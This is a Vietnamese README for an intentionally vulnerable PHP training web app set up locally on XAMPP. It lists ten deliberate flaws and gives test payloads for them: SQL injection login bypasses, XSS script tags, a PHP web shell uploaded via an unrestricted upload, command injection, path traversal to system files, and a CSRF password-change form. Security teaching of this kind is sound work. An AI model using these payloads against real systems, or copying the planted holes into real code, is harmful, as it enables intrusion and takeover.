# Vulnerable Web Application - Hướng dẫn cài đặt

## ⚠️ CẢNH BÁO
Đây là ứng dụng web được tạo ra với mục đích **GIÁO DỤC VÀ KIỂM THỬ BẢO MẬT**. 
Ứng dụng này chứa các lỗ hổng bảo mật cố ý. **KHÔNG sử dụng trong môi trường production!**

## 📋 Các lỗ hổng bảo mật

### Injection Vulnerabilities
1. **SQL Injection** - Trong `login.php` và `change_password.php`
2. **Command Injection** - Trong `ping.php`
3. **Path Traversal** - Trong `file_viewer.php`

### Cross-Site Scripting (XSS)
4. **Stored XSS** - Trong `comment.php`
5. **Reflected XSS** - Trong `search.php`

### Authentication & Authorization
6. **Weak Password** - Mật khẩu yếu (123456) và không hash
7. **IDOR (Insecure Direct Object Reference)** - Trong `profile.php` và `change_password.php`
8. **CSRF (Cross-Site Request Forgery)** - Trong `change_password.php`

### File Upload
9. **Unrestricted File Upload** - Trong `upload.php`

### Information Disclosure
10. **Information Disclosure** - Trong `profile.php`, `error_demo.php` và các error messages

## 🚀 Hướng dẫn cài đặt trên XAMPP

### Bước 1: Copy files vào XAMPP
1. Copy toàn bộ thư mục `vuln-site` vào thư mục `htdocs` của XAMPP
   - Đường dẫn: `C:\xampp\htdocs\vuln-site`

### Bước 2: Tạo Database
1. Mở trình duyệt và truy cập: `http://localhost/phpmyadmin`
2. Click vào tab "SQL"
3. Copy toàn bộ nội dung file `init_db.sql` và paste vào
4. Click "Go" để thực thi
5. Database `vuln_db` sẽ được tạo cùng với các bảng và dữ liệu mẫu

### Bước 3: Kiểm tra cấu hình
1. Mở file `config.php`
2. Kiểm tra các thông tin kết nối database:
   - Host: `localhost`
   - Database: `vuln_db`
   - Username: `root` (mặc định XAMPP)
   - Password: `` (mặc định XAMPP là rỗng)

### Bước 4: Khởi động XAMPP
1. Mở XAMPP Control Panel
2. Start **Apache** và **MySQL**
3. Đảm bảo cả hai service đều chạy (màu xanh)

### Bước 5: Truy cập ứng dụng
1. Mở trình duyệt
2. Truy cập: `http://localhost/vuln-site/`
3. Bạn sẽ thấy trang chủ với menu

## 🔐 Thông tin đăng nhập mặc định

- **Username:** `admin`
- **Password:** `123456`

## 🧪 Cách kiểm thử các lỗ hổng

### 1. SQL Injection (login.php, change_password.php)
**Payload thử nghiệm:**
- Username: `admin' OR '1'='1`
- Password: `anything`
- Hoặc: `' OR '1'='1' --`

**Kết quả:** Có thể đăng nhập mà không cần mật khẩu đúng

### 2. Stored XSS (comment.php)
**Payload thử nghiệm:**
```
<script>alert('XSS')</script>
```
hoặc
```
<img src=x onerror=alert('XSS')>
```

**Kết quả:** Script sẽ được thực thi khi xem lại comment

### 3. Reflected XSS (search.php)
**Payload thử nghiệm:**
- URL: `search.php?q=<script>alert('XSS')</script>`
- Hoặc: `search.php?q=<img src=x onerror=alert('XSS')>`
- Hoặc: `search.php?q=<svg onload=alert('XSS')>`

**Kết quả:** Script được thực thi ngay lập tức khi load trang

### 4. File Upload (upload.php)
**Payload thử nghiệm:**
Tạo file `shell.php` với nội dung:
```php
<?php
system($_GET['cmd']);
?>
```

Upload file này, sau đó truy cập:
`http://localhost/vuln-site/uploads/shell.php?cmd=dir`

**Kết quả:** Có thể thực thi lệnh hệ thống

### 5. IDOR (profile.php, change_password.php)
**Payload thử nghiệm:**
- Truy cập: `profile.php?user_id=1` (admin)
- Truy cập: `profile.php?user_id=2` (user1)
- Trong change_password.php, thay đổi user_id để đổi mật khẩu user khác

**Kết quả:** Có thể xem và thay đổi thông tin của bất kỳ user nào

### 6. Command Injection (ping.php)
**Payload thử nghiệm (Windows):**
- `ping.php?host=127.0.0.1 && dir`
- `ping.php?host=127.0.0.1 && whoami`
- `ping.php?host=127.0.0.1 && type config.php`
- `ping.php?host=127.0.0.1 && ipconfig`

**Kết quả:** Có thể thực thi bất kỳ lệnh hệ thống nào

### 7. Path Traversal (file_viewer.php)
**Payload thử nghiệm:**
- `file_viewer.php?file=config.php`
- `file_viewer.php?file=../config.php`
- `file_viewer.php?file=../../../etc/passwd` (Linux)
- `file_viewer.php?file=..\..\..\Windows\System32\drivers\etc\hosts` (Windows)

**Kết quả:** Có thể đọc bất kỳ file nào mà web server có quyền đọc

### 8. CSRF (change_password.php)
**Payload thử nghiệm:**
Tạo file HTML trên server khác:
```html
<form action="http://localhost/vuln-site/change_password.php" method="POST">
  <input type="hidden" name="user_id" value="1">
  <input type="hidden" name="new_password" value="hacked">
  <input type="submit" value="Click để nhận quà">
</form>
```

**Kết quả:** Nếu admin click vào link này, mật khẩu sẽ bị đổi mà không biết

### 9. Information Disclosure (error_demo.php, profile.php)
**Payload thử nghiệm:**
- `error_demo.php?action=db_error` - Lộ thông tin database
- `error_demo.php?action=phpinfo` - Lộ toàn bộ cấu hình PHP
- `profile.php?user_id=1` - Lộ password plain text

**Kết quả:** Thông tin nhạy cảm về hệ thống bị lộ

### 10. Weak Password
- Mật khẩu `123456` rất dễ bị brute force
- Không có giới hạn số lần đăng nhập sai
- Mật khẩu được lưu plain text (không hash)

## 📁 Cấu trúc thư mục

```
vuln-site/
│-- config.php              (kết nối DB)
│-- init_db.sql             (tạo bảng users, comments)
│-- index.php               (trang chính, menu)
│-- login.php               (SQL Injection + Weak Password)
│-- comment.php             (Stored XSS)
│-- search.php              (Reflected XSS)
│-- upload.php              (Unrestricted File Upload)
│-- profile.php             (IDOR + Information Disclosure)
│-- ping.php                (Command Injection)
│-- file_viewer.php         (Path Traversal)
│-- change_password.php     (CSRF + SQL Injection + IDOR)
│-- error_demo.php          (Information Disclosure)
│-- logout.php              (đăng xuất)
│-- uploads/                (folder lưu file)
│-- README.md               (file này)
```

## 🛠️ Yêu cầu hệ thống

- XAMPP (Apache + MySQL + PHP)
- PHP 7.0 trở lên
- MySQL 5.7 trở lên
- Trình duyệt web hiện đại

## 📝 Lưu ý

- Tất cả các lỗ hổng đều được tạo cố ý để phục vụ mục đích học tập
- Không sử dụng code này trong bất kỳ ứng dụng thực tế nào
- Chỉ sử dụng trong môi trường local, không deploy lên server công cộng
- File upload có thể chứa mã độc, cẩn thận khi test

## 🎓 Mục đích giáo dục

Ứng dụng này giúp:
- Hiểu rõ các lỗ hổng bảo mật phổ biến
- Học cách khai thác và phòng chống
- Thực hành kiểm thử bảo mật web
- Nâng cao nhận thức về bảo mật

---

**Tác giả:** Educational Purpose Only
**Ngày tạo:** 2024

